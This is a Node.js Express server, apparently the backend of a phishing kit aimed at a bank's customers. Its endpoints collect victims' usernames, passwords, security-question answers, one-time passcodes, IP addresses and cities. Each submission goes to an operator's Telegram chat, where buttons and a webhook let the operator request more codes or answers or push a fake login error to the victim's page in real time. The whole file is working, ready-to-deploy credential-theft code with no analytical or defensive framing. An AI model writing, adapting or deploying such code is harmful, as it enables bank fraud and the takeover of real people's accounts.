const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const CLIENTES_DIR = './clientes';
if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

const path = require('path');

// Limpieza automática cada 10 minutos: borra archivos de clientes con más de 60 minutos
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();

  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;

    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (tenía ${Math.round(edadMinutos)} minutos)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

app.post('/enviar', async (req, res) => {
  const { usar, clav, txid, ip, ciudad } = req.body;

  const mensaje = `
🟢BN3B-PERSON4S🟢
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clav}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const cliente = {
    status: "esperando",
    usar,
    clav,
    preguntas: [],
    esperando: null,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});



app.post('/enviar2', async (req, res) => {
  const {
    usar, clav, txid,
    pregunta1,
    respuesta1,
    ip, ciudad
  } = req.body;

  const mensaje = `
❓🔑🟢BN3B-PERSON4S🟢
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clav}</code>

${pregunta1}❓ : <code>${respuesta1}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
         [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  const cliente = cargarCliente(txid) || {};
  cliente.status = "esperando";
  guardarCliente(txid, cliente);

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});




app.post('/enviar3', async (req, res) => {
  const { usar, clav, txid, dinamic, ip, ciudad } = req.body;

  const mensaje = `
🔑🟢BN3B-PERSON4S🟢
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clav}</code>

🔑 0TP: <code>${dinamic}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
        [{ text: "🔐PREGUNTAS", callback_data: `preguntas_menu:${txid}` }],
      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
    ]
  };

  const cliente = cargarCliente(txid) || {};
  cliente.status = "esperando";
  guardarCliente(txid, cliente);

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});



app.post('/webhook', async (req, res) => {
  const message = req.body.message;

  if (message?.text && message.text.startsWith('/')) {
    const commandParts = message.text.slice(1).split(' ');
    const txid = commandParts[0];
    const pregunta = commandParts.slice(1).join(' '); // todo lo que está después del txid

    if (!txid || !pregunta.trim()) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: message.chat.id,
          text: `⚠️ Formato inválido. Usa:\n/${txid} ¿Cuál es tu pregunta?`
        })
      });
      return res.sendStatus(200);
    }

    const cliente = cargarCliente(txid) || { preguntas: [], status: 'esperando' };
    cliente.preguntas = [pregunta.trim()];
    cliente.status = 'preguntas';
    guardarCliente(txid, cliente);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: message.chat.id,
        text: `✅ Pregunta guardada para ${txid}:\n❓ ${pregunta.trim()}`
      })
    });

    return res.sendStatus(200);
  }

  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const partes = callback.data.split(":");
    const accion = partes[0];
    const txid = partes[1];

    const cliente = cargarCliente(txid) || { status: 'esperando' };
    cliente.status = accion;
    guardarCliente(txid, cliente);

    if (accion === 'preguntas_menu') {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: callback.message.chat.id,
          text: `✍️ Escribe la pregunta personalizada para ${txid}, Ej: /${txid} ¿Dónde naciste?`
        })
      });
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `Has seleccionado: ${accion}`
      })
    });

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = cargarCliente(txid) || { status: 'esperando', preguntas: [] };
  res.json({ status: cliente.status, preguntas: cliente.preguntas });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en Render puerto ${PORT}`));
